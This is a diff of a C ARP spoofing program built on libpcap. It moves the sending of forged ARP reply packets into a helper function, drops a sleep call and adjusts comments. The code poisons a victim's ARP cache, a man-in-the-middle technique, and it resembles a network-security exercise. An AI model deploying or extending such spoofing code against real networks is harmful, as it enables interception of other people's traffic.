@@ -75,6 +75,15 @@ void make_ether_pkt(ethhdr* eth_pkt, uint8_t* dhost, uint8_t* shost, arphdr arp_
 	memcpy(eth_pkt + 1, &arp_hdr, sizeof(struct arphdr));
 }
 
+void send_fake_pkt(pcap_t* handle, uint8_t* fake_packet, int size)
+{
+	if (pcap_sendpacket(handle, fake_packet, size))
+        {
+                printf("Failed send fake arp packet\n");
+                return (void)-1;
+        }
+}
+
 
 void* thread_spoof(void* data)
 {
@@ -198,11 +207,7 @@ void* thread_spoof(void* data)
 	uint8_t* fake_packet = (uint8_t*)malloc(size * sizeof(uint8_t));
 	memcpy(fake_packet, &fake_ethpkt, size * sizeof(uint8_t));
 
-	if (pcap_sendpacket(handle, fake_packet, size))
-	{
-		printf("Failed send fake arp packet\n");
-		return (void*)-1;
-	}
+	send_fake_pkt(handle, fake_packet, size);
 	printf("spoofed sender!\n");
 
 
@@ -254,8 +259,6 @@ void* thread_spoof(void* data)
 			continue;
 	}
 
-	//waiting for packet(ex: ping)....
-	sleep(1);
 
 	while (1)
 	{
@@ -300,16 +303,12 @@ void* thread_spoof(void* data)
 		//if arp packet
 		else if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806)
 		{
-			//arp request(broadcast) from sender
+			//if arp request(broadcast) from sender
 			if (!memcmp(r_ethhdr->ether_shost, s_mac, 6 * sizeof(uint8_t)) && r_packet[21] == 2)
 			{
-				printf("get arp packet from sender\n");
 				//send fake arp reply to sender
-				if (pcap_sendpacket(handle, fake_packet, size))
-				{
-					printf("Failed send fake arp packet\n");
-					return (void*)-1;
-				}
+				printf("get arp packet from sender\n");
+				send_fake_pkt(handle, fake_packet, size);
 			}
 		}
 		else
